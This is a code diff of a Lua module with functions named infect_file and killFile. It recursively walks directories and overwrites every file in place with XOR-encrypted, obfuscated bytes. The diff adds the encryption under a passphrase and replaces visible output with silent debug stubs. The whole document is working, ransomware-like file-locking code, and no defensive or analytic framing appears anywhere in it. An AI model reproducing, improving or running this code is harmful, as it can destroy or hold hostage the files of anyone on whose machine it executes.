@@ -1,18 +1,46 @@
 math.randomseed(os.time())
 
 local module = {}
-local kr = 10
-local kr2 = 1
-local key = math.random(10*kr2,3000*kr2)/kr
-local cmb = {"q","w","@","^","S","g","f","ju","ns","::"}
-local e = cmb[ math.floor((key % 1) * #cmb) + 1 ]
-local srf = io.open("soundReplace","r")
-local sr = srf:read("*a")
 
-srf:close()
+local kr  = 10
+local kr2 = kr
+local key = math.random(10*kr2,3000*kr2)/kr
+local cmb = {"q","w","@","^","S","g","f","j","s",":"}
+local e   = cmb[ math.floor((key % 1) * #cmb) + 1 ]
 
 local function printd(t)
-    --print(t)
+    -- print(t)
+end
+
+local function printd2(t)
+    -- print(t)
+end
+
+local function dbgT()
+    local current_datetime = os.clock()
+    printd2(current_datetime)
+end
+
+local function make_keystream(passphrase)
+    local ks = {}
+    for i = 1, #passphrase do
+        ks[#ks+1] = passphrase:byte(i)
+    end
+    return ks
+end
+
+local function xor_bytes(data, passphrase)
+    local ks = make_keystream(passphrase)
+    local ks_len = #ks
+    local out = {}
+
+    for i = 1, #data do
+        local b = data:byte(i)
+        local k = ks[(i - 1) % ks_len + 1]
+        out[i] = string.char(bit32.bxor(b, k))
+    end
+
+    return table.concat(out)
 end
 
 local function infectMn1(text, amt, delimiter)
@@ -21,20 +49,17 @@ local function infectMn1(text, amt, delimiter)
         local bts = {}
 
         for i = 1, #t do
-            local ch = t:sub(i,i)
+            local ch  = t:sub(i,i)
             local bbs = bts[ch] or string.byte(ch)
-            local b = bbs
-            
-            bts[ch] = bbs
-            
-            out[#out+1] = tostring(b) .. delimiter
+            bts[ch]   = bbs
+            out[#out+1] = tostring(bbs) .. delimiter
         end
 
         return table.concat(out):reverse()
     end
 
     local t = text
-    for i = 1, amt do
+    for _ = 1, amt do
         t = encode_pass(t)
     end
 
@@ -45,7 +70,7 @@ end
 local function decode_file(text)
     if not text then return nil end
 
-    local delim = text:match("DELIM=(.-)\n")
+    local delim  = text:match("DELIM=(.-)\n")
     local passes = tonumber(text:match("PASSES=(%d+)\n"))
     local body   = text:match("PASSES=%d+\n(.+)$")
 
@@ -65,14 +90,14 @@ local function decode_file(text)
     end
 
     local t = body
-    for i = 1, passes do
+    for _ = 1, passes do
         t = decode_pass(t)
     end
 
     return t
 end
 
-local function infect_file(dir,mamt)
+local function infect_file(dir, passphrase)
     local f = io.open(dir, "rb")
     if not f then
         printd("Read error")
@@ -84,9 +109,11 @@ local function infect_file(dir,mamt)
 
     printd("Original:")
     printd(original)
+    
+    local encrypted = xor_bytes(original, passphrase)
 
-    local amt = (mamt or 1) + math.floor(key/1000)
-    local infected = infectMn1(original, amt, e)
+    local amt = 1
+    local infected = infectMn1(encrypted, amt, e)
 
     local fw = io.open(dir, "wb")
     if not fw then
@@ -96,10 +123,10 @@ local function infect_file(dir,mamt)
     fw:write(infected)
     fw:close()
 
-    printd("\nFile infected.")
+    printd("\nFile encrypted.")
 end
 
-local function decodeStep(dir)
+local function decodeStep(dir, passphrase)
     local f = io.open(dir,"rb")
     if not f then
         printd("Read error")
@@ -108,36 +135,37 @@ local function decodeStep(dir)
 
     local text = f:read("*a")
     f:close()
-
+    
     local decoded = decode_file(text)
+    if not decoded then
+        printd("Decode header failed")
+        return nil
+    end
+    
+    local plain = xor_bytes(decoded, passphrase)
 
     printd("\nDecoded:")
-    printd(decoded or "<nil>")
+    printd(plain or "<nil>")
 
-    if decoded then
-        local f2 = io.open(dir,"wb")
-        if not f2 then
-            printd("Write error")
-            return
-        end
-        f2:write(decoded)
-        f2:close()
-        return decoded
+    local f2 = io.open(dir,"wb")
+    if not f2 then
+        printd("Write error")
+        return nil
+    end
+    f2:write(plain)
+    f2:close()
+    return plain
+end
+
+local function killFile(dir, times, passphrase)
+    for _ = 1, 1 + (times or 1) do
+        infect_file(dir, passphrase)
     end
 end
 
-local function killFile(dir,times)
-    for i=1,1 + (times or 1) do
-        infect_file(dir,1)
-    end
-end
-
-local function decode(dir)
-    local d = true
-    
-    while d do
-        d = decodeStep(dir)
-        
+local function decode(dir, passphrase)
+    while true do
+        local d = decodeStep(dir, passphrase)
         if not d then
             break
         end
@@ -149,10 +177,13 @@ local function getFileExtension(filename)
 end
 
 local function is_windows()
+    dbgT()
     return package.config:sub(1,1) == "\\"
 end
 
 local function get_child_files(path)
+    dbgT()
+
     local files = {}
     local cmd
 
@@ -168,34 +199,38 @@ local function get_child_files(path)
     end
 
     for file in p:lines() do
-        table.insert(files, file)
+        files[#files+1] = file
     end
+
     p:close()
+    dbgT()
 
     return files
 end
 
-local function fileBit(dir,mode,p)
+local function fileBit(dir, mode, p)
+    local passphrase = p.passphrase or "default-secret"
+
     if mode == 1 then
-        decode(dir)
+        decode(dir, passphrase)
     elseif mode == 2 then
-        killFile(dir,p.times)
+        killFile(dir, p.times or 1, passphrase)
     end
 end
 
-function module.process(dir,mode,p)
+function module.process(dir, mode, p)
+    p = p or {}
     local ext = getFileExtension(dir)
-    
+
     if ext == "" or #ext > 5 then
-        print("Folder: "..dir)
-        for i,v in ipairs(get_child_files(dir)) do
+        printd2("Folder: "..dir)
+        for _, v in ipairs(get_child_files(dir)) do
             local trueDir = dir .. "\\" .. v
-            
-            module.process(trueDir,mode,p)
+            module.process(trueDir, mode, p)
         end
     else
-        print(ext..": "..dir)
-        fileBit(dir,mode,p)
+        printd2((string.upper(string.sub(ext,2,2))..string.sub(ext,3,#ext))..": "..dir)
+        fileBit(dir, mode, p)
     end
 end
 
